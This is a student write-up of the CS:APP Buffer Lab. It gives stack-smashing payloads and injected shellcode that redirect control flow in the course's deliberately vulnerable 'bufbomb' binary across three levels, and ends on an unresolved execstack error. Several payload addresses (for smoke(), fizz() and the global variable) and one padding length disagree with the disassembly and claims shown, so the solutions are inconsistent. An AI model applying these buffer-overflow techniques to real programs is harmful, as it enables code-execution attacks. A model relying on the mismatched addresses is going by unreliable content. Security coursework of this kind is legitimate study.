# CS:APP Buffer Lab

### 0. Preface

```c
void test() 
{
	int val;
	/* Put canary on stack to detect possible corruption */ 
	volatile int local = uniqueval();
	
	val = getbuf();
	
	/* Check for corrupted stack */ 
	if (local != uniqueval()) {
		printf("Sabotaged!: the stack has been corrupted\n"); 
	}
    else if (val == cookie) {
		printf("Boom!: getbuf returned 0x%x\n", val); 
		validate(3);
	} 
	else {
		printf("Dud: getbuf returned 0x%x\n", val);
    }
}
```

```
080491f4 <getbuf>:
 80491f4:	55                   	push   %ebp
 80491f5:	89 e5                	mov    %esp,%ebp
 80491f7:	83 ec 38             	sub    $0x38,%esp
 80491fa:	8d 45 d8             	lea    -0x28(%ebp),%eax
 80491fd:	89 04 24             	mov    %eax,(%esp)
 8049200:	e8 f5 fa ff ff       	call   8048cfa <Gets>
 8049205:	b8 01 00 00 00       	mov    $0x1,%eax
 804920a:	c9                   	leave  
 804920b:	c3                   	ret    
```

```
// Stack Frame

.bottom (high address)
+ - - - - - - - - - - + ----
|                     | previous frame
|         ...         |
|                     |
| - - - - - - - - - - | ----
|         ...         | caller's frame
| - - - - - - - - - - |
| 	   argument n     |
| - - - - - - - - - - |
|         ...         |
| - - - - - - - - - - |
|      argument 7     |
| - - - - - - - - - - |
|    return address   |
| - - - - - - - - - - | ----
|        %rbp         | callee's frame (current)
| - - - - - - - - - - |
|   saved registers   |
| - - - - - - - - - - |
| 	    local n       |
| - - - - - - - - - - |
|         ...         |
| - - - - - - - - - - |
|       local 1       |
| - - - - - - - - - - |
| 	   argument n     |
| - - - - - - - - - - |
|         ...         |
| - - - - - - - - - - |
|      argument 7     |
+ - - - - - - - - - - + <- %rsp
.top (low address)
```



### 1. Candle

Goal: Before `getbuf()` returns, call `smoke()` instead of returning `test()`.

```c
void smoke()
{
    printf("Smoke!: You called smoke()\n");
    validate(0);
    exit(0);
}
```

```
08048e20 <smoke>:
 8048e20:	55                   	push   %ebp
 8048e21:	89 e5                	mov    %esp,%ebp
 8048e23:	83 ec 08             	sub    $0x8,%esp
 8048e26:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048e2d:	e8 6e fb ff ff       	call   80489a0 <entry_check>
 8048e32:	c7 04 24 47 9a 04 08 	movl   $0x8049a47,(%esp)
 8048e39:	e8 d6 f8 ff ff       	call   8048714 <puts@plt>
 8048e3e:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048e45:	e8 96 fc ff ff       	call   8048ae0 <validate>
 8048e4a:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048e51:	e8 4e f9 ff ff       	call   80487a4 <exit@plt>
 8048e56:	8d 76 00             	lea    0x0(%esi),%esi
 8048e59:	8d bc 27 00 00 00 00 	lea    0x0(%edi,%eiz,1),%edi
```

According to `0x80491fa` in `getbuf()`, we can learn that the length of the buffer in stack is `0x28`. Through the structure of stack frame, we can input excess words to buffer to overwrite the stack pointer and return address of `getbuf()`. So we can fill previous `0x28` bytes with any digits, then add extra address of `smook()` entrance, which is `18 8c 04 08`(little endian).

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 18 8c 04 08
```

Then, convert these bytes to characters using `hex2raw` and send them to buffer.

```
Type string:Smoke!: You called smoke()
VALID
NICE JOB!
```



### 2. Sparkler

Goal: Before `getbuf()` returns, call `fizz()` instead of returning `test()`, and pass the cookie as its argument.

```c
void fizz(int val)
{
    if (val == cookie) {
        printf("Fizz!: You called fizz(0x%x)\n", val);
        validate(1);
    } else
        printf("Misfire: You called fizz(0x%x)\n", val);
    exit(0);
}
```

```
08048dc0 <fizz>:
 8048dc0:	55                   	push   %ebp
 8048dc1:	89 e5                	mov    %esp,%ebp
 8048dc3:	53                   	push   %ebx
 8048dc4:	83 ec 14             	sub    $0x14,%esp
 8048dc7:	8b 5d 08             	mov    0x8(%ebp),%ebx
 8048dca:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048dd1:	e8 ca fb ff ff       	call   80489a0 <entry_check>
 8048dd6:	3b 1d cc a1 04 08    	cmp    0x804a1cc,%ebx
 8048ddc:	74 22                	je     8048e00 <fizz+0x40>
 8048dde:	89 5c 24 04          	mov    %ebx,0x4(%esp)
 8048de2:	c7 04 24 98 98 04 08 	movl   $0x8049898,(%esp)
 8048de9:	e8 76 f9 ff ff       	call   8048764 <printf@plt>
 8048dee:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048df5:	e8 aa f9 ff ff       	call   80487a4 <exit@plt>
 8048dfa:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi
 8048e00:	89 5c 24 04          	mov    %ebx,0x4(%esp)
 8048e04:	c7 04 24 29 9a 04 08 	movl   $0x8049a29,(%esp)
 8048e0b:	e8 54 f9 ff ff       	call   8048764 <printf@plt>
 8048e10:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
 8048e17:	e8 c4 fc ff ff       	call   8048ae0 <validate>
 8048e1c:	eb d0                	jmp    8048dee <fizz+0x2e>
 8048e1e:	89 f6                	mov    %esi,%esi
```

Generally, the argument will be stored in `0x8(%ebp)`, so we can put additional bytes as argument after return address.

```
00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 42 8c 04 08 00 00 00 00 45 32 2a 1c
```

Note that `42 8c 04 08` is the address of `fizz()`, and the `45 32 2a 1c` is the cookie. Both of them are represented in little endian.

```
Type string:Fizz!: You called fizz(0x1c2a3245)
VALID
NICE JOB!
```



### 3. Firecracker

Goal: Before `getbuf()` returns, call `bang()` instead of returning `test()`, and change the global variable to the cookie.

```c
int global_value = 0;

void bang(int val)
{
    if (global_value == cookie) {
    	printf("Bang!: You set global_value to 0x%x\n", global_value);
    	validate(2);
    } else
    	printf("Misfire: global_value = 0x%x\n", global_value);
    exit(0);
}
```

```
08048d60 <bang>:
 8048d60:	55                   	push   %ebp
 8048d61:	89 e5                	mov    %esp,%ebp
 8048d63:	83 ec 08             	sub    $0x8,%esp
 8048d66:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
 8048d6d:	e8 2e fc ff ff       	call   80489a0 <entry_check>
 8048d72:	a1 dc a1 04 08       	mov    0x804a1dc,%eax
 8048d77:	3b 05 cc a1 04 08    	cmp    0x804a1cc,%eax
 8048d7d:	74 21                	je     8048da0 <bang+0x40>
 8048d7f:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048d83:	c7 04 24 0b 9a 04 08 	movl   $0x8049a0b,(%esp)
 8048d8a:	e8 d5 f9 ff ff       	call   8048764 <printf@plt>
 8048d8f:	c7 04 24 00 00 00 00 	movl   $0x0,(%esp)
 8048d96:	e8 09 fa ff ff       	call   80487a4 <exit@plt>
 8048d9b:	90                   	nop
 8048d9c:	8d 74 26 00          	lea    0x0(%esi,%eiz,1),%esi
 8048da0:	89 44 24 04          	mov    %eax,0x4(%esp)
 8048da4:	c7 04 24 70 98 04 08 	movl   $0x8049870,(%esp)
 8048dab:	e8 b4 f9 ff ff       	call   8048764 <printf@plt>
 8048db0:	c7 04 24 02 00 00 00 	movl   $0x2,(%esp)
 8048db7:	e8 24 fd ff ff       	call   8048ae0 <validate>
 8048dbc:	eb d1                	jmp    8048d8f <bang+0x2f>
 8048dbe:	89 f6                	mov    %esi,%esi
```

We can't change the code in `test()` or `bang()`, what we can do to change the global value? The answer is the buffer, we can inject code into the buffer. 

We can get the address of `global_value` through disassembly code, it is `0x0804d100`. By setting break point in `getbuf()`, we can get the buffer address.

```
(gdb) p/x ($ebp-0x28)
$1 = 0x55683be8
```

The code we are going to inject into buffer does two main things, change global value and change return address to `bang()`.

```
00000000 <.text>:
   0:	c7 05 00 d1 04 08 45 	movl   $0x1c2a3245,0x804d100
   7:	32 2a 1c 
   a:	68 60 8d 04 08       	push   $0x8048d60
   f:	c3                   	ret  
```

The code is 16 bytes large, will not destroy the structure of stack frame. The input bytes are shown below.

```
c7 05 00 d1 04 08 45 32 2a 1c 68 60 8d 04 08 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 e8 3b 68 55
```

Note that the program need to be executed in `gdb` with `execstack`. It should be

```
Type string:Bang!: You set global_value to 0x1c2a3245
VALID
NICE JOB!
```

But, I bumped this problem while using `execstack` and couldn't solve it. 

```
> execstack -s bufbomb
execstack: bufbomb: section file offsets not monotonically increasing.
```

